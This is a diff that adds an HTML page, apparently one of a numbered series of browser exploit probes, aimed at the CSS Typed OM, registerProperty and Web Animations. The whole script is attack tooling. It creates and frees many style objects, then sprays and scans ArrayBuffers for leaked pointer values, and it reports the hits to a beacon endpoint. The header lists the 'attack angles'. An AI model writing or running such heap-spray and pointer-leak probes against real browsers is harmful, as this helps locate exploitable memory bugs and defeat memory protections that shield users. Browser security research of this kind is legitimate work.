@@ -1,0 +1,480 @@
+<!--
+  p799: CSS Typed OM / CSS Paint API / CSS.registerProperty /
+        CSSStyleValue / element.computedStyleMap / attributeStyleMap
+
+  CSS Typed OM: element.attributeStyleMap and computedStyleMap()
+  return CSSStyleValue objects (CSSUnitValue, CSSKeywordValue,
+  CSSTransformValue, CSSColorValue, etc). Each value is a C++
+  wrapper allocated from the CSS typed OM pool. Getting/setting
+  via StylePropertyMap exercises the typed value allocator.
+
+  CSS.registerProperty: registers a custom property with type,
+  initial value, and inheritance. Each registration creates C++
+  PropertyRegistration state.
+
+  CSS Paint API: CSS.paintWorklet.addModule() loads a paint worklet.
+  Even if the module fails, the worklet infrastructure allocates
+  C++ PaintWorkletGlobalScope, PaintDefinition objects.
+
+  CSSNumericValue: CSSUnitValue, CSSMathSum, CSSMathProduct, etc
+  form a tree of C++ numeric objects. Operations (add, sub, mul,
+  to, toSum) allocate new nodes.
+
+  CSSTransformValue: wraps CSSTranslate, CSSRotate, CSSScale,
+  CSSSkew, CSSPerspective components. Each component is a C++
+  transform object.
+
+  Attack angles:
+  A) attributeStyleMap set/get/delete churn.
+  B) computedStyleMap() value extraction.
+  C) CSSNumericValue arithmetic tree building.
+  D) CSSTransformValue component lifecycle.
+  E) CSS.registerProperty custom property registration.
+  F) Element.animate() with typed keyframes.
+
+  CRASH_CLASS: LOW (CSS Typed OM, no side effects)
+  prior art: p794 (animations), p796 (CSS rules)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p799</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p799-START');
+
+// Feature detect CSS Typed OM
+var hasTypedOM=!!(HTMLElement.prototype.attributeStyleMap||
+  (document.createElement('div').attributeStyleMap));
+var hasComputedMap=typeof(document.createElement('div').computedStyleMap)==='function';
+var hasCSSUnitValue=typeof CSSUnitValue!=='undefined';
+
+b('p799 hasTypedOM='+hasTypedOM+' hasComputedMap='+hasComputedMap+' hasCSSUnitValue='+hasCSSUnitValue);
+
+// === Section A: attributeStyleMap set/get/delete churn ===
+try{
+  b('A-attributestylemap');
+  var aHits=0;
+
+  if(!hasTypedOM){
+    b('A-SKIP no attributeStyleMap');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var elements=[];
+
+        for(var i=0;i<40;i++){
+          var el=document.createElement('div');
+          el.style.cssText='width:30px;height:30px;display:inline-block;';
+          document.body.appendChild(el);
+
+          var map=el.attributeStyleMap;
+
+          // Set many properties via typed OM
+          var props=[
+            ['width','50px'],['height','40px'],['margin-top','10px'],
+            ['margin-left','5px'],['padding','8px'],['border-width','2px'],
+            ['font-size','16px'],['line-height','1.5'],['opacity','0.8'],
+            ['z-index','10'],['top','20px'],['left','30px'],
+            ['background-color','rgb(100,150,200)'],
+            ['color','rgb(50,50,50)'],['transform','rotate(45deg)']
+          ];
+
+          for(var p=0;p<props.length;p++){
+            try{map.set(props[p][0],props[p][1]);}catch(e){}
+          }
+
+          if(round===0&&i===0){
+            b('A map.size='+map.size);
+            try{
+              var w=map.get('width');
+              b('A width='+w+' type='+(w?w.constructor.name:'null'));
+            }catch(e){}
+          }
+
+          // Delete all
+          for(var p=0;p<props.length;p++){
+            try{map.delete(props[p][0]);}catch(e){}
+          }
+
+          // Re-set and clear
+          for(var p=0;p<props.length;p++){
+            try{map.set(props[p][0],props[p][1]);}catch(e){}
+          }
+          try{map.clear();}catch(e){}
+
+          elements.push(el);
+        }
+
+        if(round===0)b('A set/deleted '+props.length+' properties on '+elements.length+' elements');
+
+        for(var i=0;i<elements.length;i++){
+          document.body.removeChild(elements[i]);
+        }
+        elements=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      aHits+=sprayAndScan('A',round,[32,48,64,96]);
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: computedStyleMap() value extraction ===
+try{
+  b('B-computedstylemap');
+  var bHits=0;
+
+  if(!hasComputedMap){
+    b('B-SKIP no computedStyleMap');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var elements=[];
+
+        for(var i=0;i<30;i++){
+          var el=document.createElement('div');
+          el.style.cssText='width:'+(50+i)+'px;height:'+(40+i)+'px;margin:'+i+'px;padding:'+(i*2)+'px;font-size:'+(12+i)+'px;opacity:'+(0.5+i*0.01)+';transform:rotate('+(i*10)+'deg) translateX('+(i*5)+'px);background:rgb('+(i*8)+',100,200);color:rgb(50,'+(i*5)+',50);border:2px solid red;position:relative;top:'+(i*3)+'px;left:'+(i*2)+'px;display:inline-block;';
+          document.body.appendChild(el);
+
+          var cmap=el.computedStyleMap();
+
+          // Read all computed values
+          var readProps=['width','height','margin-top','margin-left',
+            'padding-top','font-size','opacity','transform',
+            'background-color','color','border-top-width',
+            'top','left','display','position'];
+
+          for(var p=0;p<readProps.length;p++){
+            try{
+              var val=cmap.get(readProps[p]);
+              if(round===0&&i===0&&p<3){
+                b('B '+readProps[p]+'='+val+' type='+(val?val.constructor.name:'null'));
+              }
+            }catch(e){}
+          }
+
+          // Iterate all entries
+          try{
+            var count=0;
+            cmap.forEach(function(val,prop){count++;});
+            if(round===0&&i===0)b('B computedMap entries='+count);
+          }catch(e){}
+
+          elements.push(el);
+        }
+
+        if(round===0)b('B read computedStyleMap on '+elements.length+' elements');
+
+        for(var i=0;i<elements.length;i++){
+          document.body.removeChild(elements[i]);
+        }
+        elements=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      bHits+=sprayAndScan('B',round,[32,48,64,96,128]);
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: CSSNumericValue arithmetic tree ===
+try{
+  b('C-cssnumeric');
+  var cHits=0;
+
+  if(!hasCSSUnitValue){
+    b('C-SKIP no CSSUnitValue');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var values=[];
+
+        for(var i=0;i<60;i++){
+          try{
+            var px=new CSSUnitValue(10+i,'px');
+            var em=new CSSUnitValue(1+i*0.1,'em');
+            var pct=new CSSUnitValue(50+i,'percent');
+            var deg=new CSSUnitValue(i*15,'deg');
+            var s=new CSSUnitValue(i*0.5,'s');
+
+            // Arithmetic operations build C++ math trees
+            try{var sum=px.add(new CSSUnitValue(5,'px'));values.push(sum);}catch(e){}
+            try{var sub=px.sub(new CSSUnitValue(2,'px'));values.push(sub);}catch(e){}
+            try{var mul=px.mul(3);values.push(mul);}catch(e){}
+            try{var div=px.div(2);values.push(div);}catch(e){}
+
+            // Cross-unit operations create CSSMathSum
+            try{var mixed=px.add(em);values.push(mixed);}catch(e){}
+            try{var mixed2=px.add(pct);values.push(mixed2);}catch(e){}
+
+            // Conversions
+            try{var conv=deg.to('rad');values.push(conv);}catch(e){}
+            try{var conv2=s.to('ms');values.push(conv2);}catch(e){}
+
+            // min/max/clamp
+            try{var mn=CSSNumericValue.min?CSSNumericValue.min(px,new CSSUnitValue(20,'px')):null;if(mn)values.push(mn);}catch(e){}
+            try{var mx=CSSNumericValue.max?CSSNumericValue.max(px,new CSSUnitValue(5,'px')):null;if(mx)values.push(mx);}catch(e){}
+
+            if(round===0&&i===0){
+              b('C px='+px+' sum='+sum+' mixed='+(mixed||'N/A'));
+            }
+          }catch(e){
+            if(i===0&&round===0)b('C num_err='+e.message);
+          }
+        }
+
+        if(round===0)b('C created '+values.length+' CSSNumericValue objects');
+        values=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      cHits+=sprayAndScan('C',round,[32,48,64,96]);
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: CSSTransformValue component lifecycle ===
+try{
+  b('D-csstransform');
+  var dHits=0;
+
+  var hasCSSTransform=typeof CSSTransformValue!=='undefined';
+  if(!hasCSSTransform){
+    b('D-SKIP no CSSTransformValue');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var transforms=[];
+
+        for(var i=0;i<40;i++){
+          try{
+            var components=[];
+
+            try{components.push(new CSSTranslate(new CSSUnitValue(i*10,'px'),new CSSUnitValue(i*5,'px')));}catch(e){}
+            try{components.push(new CSSRotate(new CSSUnitValue(i*15,'deg')));}catch(e){}
+            try{components.push(new CSSScale(1+i*0.1,1-i*0.05));}catch(e){}
+            try{components.push(new CSSSkewX(new CSSUnitValue(i*5,'deg')));}catch(e){}
+            try{components.push(new CSSSkewY(new CSSUnitValue(i*3,'deg')));}catch(e){}
+            try{components.push(new CSSPerspective(new CSSUnitValue(500+i*10,'px')));}catch(e){}
+
+            if(components.length>0){
+              var tv=new CSSTransformValue(components);
+              transforms.push(tv);
+
+              if(round===0&&i===0){
+                b('D transform length='+tv.length+' is2D='+tv.is2D);
+                b('D [0]='+tv[0]+' type='+(tv[0]?tv[0].constructor.name:'?'));
+              }
+
+              // toMatrix
+              try{
+                var matrix=tv.toMatrix();
+                if(round===0&&i===0)b('D matrix='+matrix);
+              }catch(e){}
+            }
+          }catch(e){
+            if(i===0&&round===0)b('D transform_err='+e.message);
+          }
+        }
+
+        if(round===0)b('D created '+transforms.length+' CSSTransformValues');
+        transforms=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[32,48,64,96,128]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: CSS.registerProperty custom property ===
+try{
+  b('E-registerproperty');
+  var eHits=0;
+
+  var hasRegister=CSS&&typeof CSS.registerProperty==='function';
+  if(!hasRegister){
+    b('E-SKIP no CSS.registerProperty');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var regCount=0;
+
+        for(var i=0;i<30;i++){
+          var name='--test-prop-'+round+'-'+i;
+          try{
+            CSS.registerProperty({
+              name:name,
+              syntax:(['<color>','<length>','<number>','<percentage>','<integer>','<angle>','<time>','<resolution>','<custom-ident>','*'])[i%10],
+              inherits:i%2===0,
+              initialValue:(['red','10px','42','50%','7','45deg','1s','96dpi','default','hello'])[i%10]
+            });
+            regCount++;
+          }catch(e){
+            // Property may already be registered from previous round
+          }
+        }
+
+        // Use registered properties on elements
+        var elements=[];
+        for(var i=0;i<20;i++){
+          var el=document.createElement('div');
+          el.style.cssText='display:inline-block;width:30px;height:30px;';
+          for(var p=0;p<Math.min(regCount,10);p++){
+            try{
+              el.style.setProperty('--test-prop-'+round+'-'+p,(['blue','20px','100','75%','15','90deg','2s','192dpi','other','world'])[p%10]);
+            }catch(e){}
+          }
+          document.body.appendChild(el);
+
+          if(round===0&&i===0){
+            try{
+              var val=getComputedStyle(el).getPropertyValue('--test-prop-'+round+'-0');
+              b('E registered prop value='+val);
+            }catch(e){}
+          }
+
+          elements.push(el);
+        }
+
+        if(round===0)b('E registered '+regCount+' custom properties, applied to '+elements.length+' elements');
+
+        for(var i=0;i<elements.length;i++){
+          document.body.removeChild(elements[i]);
+        }
+        elements=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      eHits+=sprayAndScan('E',round,[32,48,64,96]);
+    }
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Element.animate() with typed OM keyframes ===
+try{
+  b('F-typed-animate');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var animations=[];
+
+      for(var i=0;i<30;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:20px;height:20px;background:coral;display:inline-block;';
+        document.body.appendChild(el);
+
+        try{
+          // Animate with many properties
+          var anim=el.animate([
+            {
+              transform:'translateX(0) rotate(0deg) scale(1)',
+              opacity:1,
+              width:'20px',
+              height:'20px',
+              backgroundColor:'coral',
+              borderRadius:'0%',
+              offset:0
+            },
+            {
+              transform:'translateX(100px) rotate(180deg) scale(1.5)',
+              opacity:0.3,
+              width:'40px',
+              height:'40px',
+              backgroundColor:'teal',
+              borderRadius:'50%',
+              offset:0.5
+            },
+            {
+              transform:'translateX(0) rotate(360deg) scale(1)',
+              opacity:1,
+              width:'20px',
+              height:'20px',
+              backgroundColor:'coral',
+              borderRadius:'0%',
+              offset:1
+            }
+          ],{
+            duration:300+i*10,
+            iterations:2,
+            composite:['replace','add','accumulate'][i%3],
+            iterationComposite:['replace','accumulate'][i%2]
+          });
+
+          // Access effect's keyframes via typed OM
+          try{
+            var effect=anim.effect;
+            var kfs=effect.getKeyframes();
+            if(round===0&&i===0){
+              b('F keyframes='+kfs.length+' composite='+kfs[0].composite);
+            }
+          }catch(e){}
+
+          // Exercise timing
+          try{
+            var ct=anim.effect.getComputedTiming();
+            if(round===0&&i===0){
+              b('F duration='+ct.duration+' progress='+ct.progress);
+            }
+          }catch(e){}
+
+          anim.cancel();
+          animations.push({anim:anim,el:el});
+        }catch(e){
+          if(i===0&&round===0)b('F anim_err='+e.message);
+          document.body.removeChild(el);
+        }
+      }
+
+      if(round===0)b('F created/cancelled '+animations.length+' typed animations');
+
+      for(var i=0;i<animations.length;i++){
+        try{document.body.removeChild(animations[i].el);}catch(e){}
+      }
+      animations=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p799-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
